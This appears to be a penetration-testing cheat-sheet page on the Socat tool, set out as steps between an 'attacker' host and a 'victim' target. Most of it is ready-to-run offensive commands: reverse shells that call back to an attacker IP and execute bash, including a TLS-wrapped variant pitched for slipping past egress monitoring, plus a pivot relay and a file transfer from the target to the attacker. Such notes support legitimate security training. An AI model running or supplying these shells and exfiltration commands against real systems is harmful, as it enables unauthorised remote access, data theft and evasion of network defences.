---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# Socat

Socat ("**SO**cket **CAT**") establishes a bidirectional data stream between two independent endpoints - files, pipes, sockets, a terminal, or a running process. Where [netcat.md](../post-exploitation/netcat.md "mention") gives us a handful of fixed primitives, Socat's address syntax lets us combine almost any two endpoints, which makes it one of the more flexible tools in the toolbox for shells, relays, port forwarding and encrypted listeners.

{% hint style="info" %}
#### Download & Install

[http://www.dest-unreach.org/socat/](http://www.dest-unreach.org/socat/)

Usually already installed, or available via `apt install socat`.
{% endhint %}

Every Socat command takes the same basic shape - two addresses, with data flowing between them:

```bash
socat <address1> <address2>
```

***

## Basic Reverse Shell

{% stepper %}
{% step %}
### Start the Listener

On our attack host:

```bash
clue@attacker[~]$ socat TCP-LISTEN:4444,reuseaddr file:`tty`,raw,echo=0
```
{% endstep %}

{% step %}
### Trigger the Callback

On the target, provided Socat is installed there too:

```bash
victim@target$ socat TCP:10.10.14.5:4444 EXEC:'bash -li'
```

{% hint style="success" %}
This drops us straight into a fully interactive TTY — no need for the usual `python3 -c 'import pty; pty.spawn("/bin/bash")'` upgrade dance that a NetCat shell needs.
{% endhint %}
{% endstep %}
{% endstepper %}

***

## Fully Interactive TTY with Job Control

The shell above is interactive, but it still won't support job control (Ctrl+C, Ctrl+Z, tab completion). For that, use the `pty` address type on both ends.

{% stepper %}
{% step %}
### Listener

```bash
clue@attacker[~]$ socat file:`tty`,raw,echo=0 tcp-listen:4444
```
{% endstep %}

{% step %}
### Callback

```bash
victim@target$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
{% endstep %}
{% endstepper %}

***

## Encrypted Reverse Shell

A plain Socat shell is sent in the clear, same as NetCat. Where that matters - noisy networks, egress monitoring - we can wrap the connection in TLS.

{% stepper %}
{% step %}
### Generate a Self-Signed Certificate

```bash
clue@attacker[~]$ openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
clue@attacker[~]$ cat shell.key shell.crt > shell.pem
```
{% endstep %}

{% step %}
### Start an Encrypted Listener

```bash
clue@attacker[~]$ socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr file:`tty`,raw,echo=0
```
{% endstep %}

{% step %}
### Connect from the Target

```bash
victim@target$ socat OPENSSL:10.10.14.5:4444,verify=0 EXEC:'bash -li'
```

{% hint style="info" %}
`verify=0` on both ends skips certificate validation, which is fine for a self-signed one-off cert used for a single engagement.
{% endhint %}
{% endstep %}
{% endstepper %}

***

## Port Forwarding & Relays

Socat is also a convenient way to relay a port from one host to another, without the overhead of a full pivoting tool - useful for a quick one-off relay.

```bash
clue@attacker[~]$ socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.5.19:80
```

{% hint style="info" %}
`fork` spawns a new child process for each connection, allowing the listener to accept multiple simultaneous connections rather than exiting after the first.
{% endhint %}

Any connection to port `8080` on our attack host is now relayed straight through to port `80` on `172.16.5.19`, which is handy when a target is only reachable from a pivot host and we want direct access without setting up a full SOCKS tunnel.

***

## File Transfer

```bash
# Receiving host
clue@attacker[~]$ socat TCP-LISTEN:4444,reuseaddr file:incoming_file,create

# Sending host
victim@target$ socat TCP:10.10.14.5:4444 file:file_to_send
```
